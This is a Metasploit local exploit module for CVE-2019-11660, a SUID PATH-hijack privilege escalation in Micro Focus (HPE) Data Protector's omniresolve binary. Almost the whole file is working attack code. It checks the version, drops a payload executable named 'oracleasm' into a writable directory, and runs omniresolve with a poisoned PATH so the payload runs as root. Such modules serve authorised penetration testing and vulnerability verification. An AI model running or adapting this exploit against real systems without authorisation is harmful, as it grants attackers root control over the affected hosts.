# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Micro Focus (HPE) Data Protector SUID Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the trusted `$PATH` environment
        variable of the SUID binary `omniresolve` in
        Micro Focus (HPE) Data Protector A.10.40 and prior.

        The `omniresolve` executable calls the `oracleasm` binary using
        a relative path and the trusted environment `$PATH`, which allows
        an attacker to execute a custom binary with `root` privileges.

        This module has been successfully tested on:
        HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016;
        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core)

        The vulnerability has been patched in:
        Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;s7u55&#039;, # Discovery and Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;2019-09-13&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Micro Focus (HPE) Data Protector <= 10.40 build 118&#039;,
            upper_version: Gem::Version.new(&#039;10.40&#039;)
          ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependSetgid&#039; => true,
          &#039;PrependSetuid&#039; => true
        },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-11660&#039; ],
          [ &#039;URL&#039;, &#039;https://softwaresupport.softwaregrp.com/doc/KM03525630&#039; ]
        ]
    ))

    register_options(
      [
        OptString.new(&#039;SUID_PATH&#039;, [ true, &#039;Path to suid executable omniresolve&#039;, &#039;/opt/omni/lbin/omniresolve&#039; ])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;ForceExploit&#039;, [ false, &#039;Override check result&#039;, false ]),
        OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def suid_bin_path
    datastore[&#039;SUID_PATH&#039;].to_s
  end

  def check
    unless setuid? suid_bin_path
      vprint_error("#{suid_bin_path} executable is not setuid")
      return CheckCode::Safe
    end

    info = cmd_exec("#{suid_bin_path} -ver").to_s
    if info =~ /(?<=\w\.)(\d\d\.\d\d)(.*)(?<=build )(\d\d\d)/
      version = &#039;%.2f&#039; % $1.to_f
      build = $3.to_i
      vprint_status("omniresolve version #{version} build #{build}")

      unless Gem::Version.new(version) < target[:upper_version] ||
             (Gem::Version.new(version) == target[:upper_version] && build <= 118)
        return CheckCode::Safe
      end

      return CheckCode::Appears
    end

    vprint_error("Could not parse omniresolve -ver output")
    CheckCode::Detected
  end

  def exploit
    if check == CheckCode::Safe
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;)
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;)
      end
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    payload_path = File.join(base_dir, &#039;oracleasm&#039;)
    register_file_for_cleanup(payload_path)
    write_file(payload_path, generate_payload_exe)
    chmod(payload_path)

    trigger_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))
    register_file_for_cleanup(trigger_path)
    write_file(trigger_path, "#{rand_text_alpha(5..10)}:#{rand_text_alpha(5..10)}")
    cmd_exec("env PATH=\"#{base_dir}:$PATH\" #{suid_bin_path} -i #{trigger_path} & echo ")
  end
end

